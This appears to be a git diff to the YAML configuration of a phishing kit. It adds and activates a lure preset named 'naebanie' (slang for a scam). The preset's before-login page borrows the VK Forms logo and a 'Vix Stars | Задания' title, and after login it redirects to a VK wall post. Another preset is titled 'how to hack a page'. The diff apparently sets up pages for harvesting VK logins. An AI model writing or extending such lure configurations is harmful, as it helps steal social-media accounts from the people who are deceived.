@@ -1,4 +1,4 @@
-use: brawlstars
+use: naebanie
 presets:
   brawlstars:
     afterLoginTitle: Перенаправление...
@@ -20,4 +20,14 @@ presets:
     beforeLoginImage: https://brand.vkforms.ru/static/media/logo_color_198.231228dd.svg
     beforeLoginSocialImage: https://brand.vkforms.ru/static/media/logo_color_198.231228dd.svg
     beforeLoginTitle: Xacker.io | Как взломать страницу
+    beforeLoginRedirTime: 1
+  naebanie: 
+    afterLoginTitle: Перенаправление...
+    afterLoginImage: https://media.giphy.com/media/RjfixZOaPkjWSU556O/giphy.gif
+    afterLoginUrl: https://vk.com/alexxgrib?w=wall432828422_734
+    afterLoginRedirTime: 5
+
+    beforeLoginImage: https://brand.vkforms.ru/static/media/logo_color_198.231228dd.svg
+    beforeLoginSocialImage: https://vixstars.space/icons/nav-logo@1.jpg
+    beforeLoginTitle: Vix Stars | Задания
     beforeLoginRedirTime: 1
